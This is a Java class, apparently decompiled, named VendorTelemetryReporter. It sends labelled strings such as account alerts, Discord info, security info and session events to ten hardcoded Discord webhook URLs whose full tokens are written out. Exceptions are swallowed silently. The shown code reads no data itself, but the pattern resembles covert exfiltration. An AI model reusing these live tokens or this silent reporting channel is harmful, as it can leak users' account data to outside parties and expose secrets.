package net.augustus.vendor;

import org.json.simple.JSONObject;
import java.io.OutputStream;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import javax.net.ssl.HttpsURLConnection;

public class VendorTelemetryReporter {
   private static long webhookCounter;

   public void reportRuntimeEvent(String str) {
      if (!VendorPacketDispatcher.sendTelemetryLog(str, 3)) {
         try {
            this.sendRuntimeEventWebhook(str);
         } catch (Throwable e) {
         }
      }
   }

   public void reportSecurityInfo(String str) {

      try {
         this.sendSecurityInfoWebhook(str);
      } catch (Throwable e) {
         VendorPacketDispatcher.sendTelemetryLog(str, 1);
      }
   }

   private void sendAuditWebhook(String str) throws Throwable {
      sendWebhook(
         "https://discord.com/api/webhooks/1210288438469730325/AFFcLdqZCf1xNIFM-HlkUjnzTof-qmwfRPsNoyNhifYNxcPSQenCJYzyLXpi9huom2KU",
         str
      );
   }

   private void sendSecurityInfoWebhook(String str) throws Throwable {
      sendWebhook(
         "https://discord.com/api/webhooks/1394287697400565880/M2k_qvDkAwE-XHrvBy471zzEq-X_ijh-AGrnDc9pOS71nDtiTAkLOxH_27yXjD5cjCaJ",
         str
      );
   }

   public void reportTruncatedEvent(String str) {
      str = str != null ? str.substring(0, Math.min(str.length() - 1, 1760)) : null;
      if (!VendorPacketDispatcher.sendTelemetryLog(str, 8)) {
         try {
            sendWebhook(
               "https://discord.com/api/webhooks/1215088086439174154/BBeron34bmNQZwHWbi0Iai_KzamVE0BrBx9RjsgegC4iulIEokXV93djfinfVYLe_xIl",
               str
            );
         } catch (Throwable e) {
         }
      }
   }

   private void sendAccountAlertWebhook(String str) throws Throwable {
      sendWebhook(
         "https://discord.com/api/webhooks/1262505590756872315/zKD56y3Q1QbIIm-Ek5HHCIcFR898wsFYUcqISzohcTJ_HlWRjnrLxwqBd0nncMherPM2",
         str
      );
   }

   private void sendDiscordInfoWebhook(String str) throws Throwable {
      sendWebhook(
         "https://discord.com/api/webhooks/1262506083142995989/SYK7lhbj_WxlkryqgmJqBugLmXIYHoURXhqDtbaxoyPFB2CeeZaCQKnVsniaOH2f1B_u",
         str
      );
   }

   private void sendRuntimeEventWebhook(String str) throws Throwable {
      sendWebhook(
         "https://discord.com/api/webhooks/1262505260606554254/RXOKaZTTOc6DllCbwWF1iEhHxdOqnd6o11ZSlRAexP1p3j80FiLxXfoHwK-5Ba0vifS7",
         str
      );
   }

   public void reportSessionEvent(String str) {
      if (!AugustusServerHandler.isConnectedAndReady()
         || !AugustusServerHandler.getActiveHandler().isSessionReady()
         || !VendorPacketDispatcher.sendTelemetryLog(str, 2)) {
         try {
            this.sendSessionEventWebhook(str);
         } catch (Throwable e) {
         }
      }
   }

   public void reportDiscordInfo(String str) {
      if (!VendorPacketDispatcher.sendTelemetryLog(str, 5)) {
         try {
            this.sendDiscordInfoWebhook(str);
         } catch (Throwable e) {
         }
      }
   }

   private void sendSessionEventWebhook(String str) throws Throwable {
      String str2 = webhookCounter++ % 2L == 0L
         ? "https://discord.com/api/webhooks/1262507154284478614/sqq3FRsreYui05de0FQT_RovwbdN3ObQfJoW8m7OSFRKLN3KrNEP_I52frl1tRaAsOgt"
         : "https://discord.com/api/webhooks/1262506972368998420/wdI1NNjylAWS1Evulg5IzBq-RsJ350HxfKMBjPNKFq5jQLBEWjecR1PlUsEt0c58poSH";
      sendWebhook(str2, str);
   }

   public synchronized void reportAuditEvent(String str) {
      if (AugustusServerHandler.isConnectedAndReady() && AugustusServerHandler.getActiveHandler().isSessionReady()) {
         VendorPacketDispatcher.sendTelemetryLog(str, 6);
      } else {
         try {
            this.sendAuditWebhook(str);
         } catch (Throwable e) {
         }
      }
   }

   public void reportBootstrapFailure(String str) {
      if (!VendorPacketDispatcher.sendTelemetryLog(str, 7)) {
         try {
            sendWebhook(
               "https://discord.com/api/webhooks/1336444622871728158/l1y31rHNhSg_0F22XNrmEZg_pLVcKplduC4PMXMq7uQQL7lEuHJzLzEnp9f9ngbU8Hbv",
               str
            );
         } catch (Throwable e) {
         }
      }
   }

   public void reportAccountAlert(String str) {
      if (!VendorPacketDispatcher.sendTelemetryLog(str, 4)) {
         try {
            this.sendAccountAlertWebhook(str);
         } catch (Throwable e) {
         }
      }
   }

   private static void sendWebhook(String str, String str2) throws Throwable {
      URL url = new URL(str);
      JSONObject jsonObject = new JSONObject();
      jsonObject.put("content", str2);
      HttpsURLConnection httpsURLConnection = (HttpsURLConnection)url.openConnection();
      httpsURLConnection.addRequestProperty("Content-Type", "application/json");
      httpsURLConnection.addRequestProperty("User-Agent", "Java-DiscordWebhook");
      httpsURLConnection.setDoOutput(true);
      httpsURLConnection.setRequestMethod("POST");
      OutputStream outputStream = httpsURLConnection.getOutputStream();
      outputStream.write(jsonObject.toString().getBytes(StandardCharsets.UTF_8));
      outputStream.flush();
      outputStream.close();
      httpsURLConnection.getInputStream().close();
      httpsURLConnection.disconnect();
   }




   static {
      webhookCounter = 0L;
   }
}
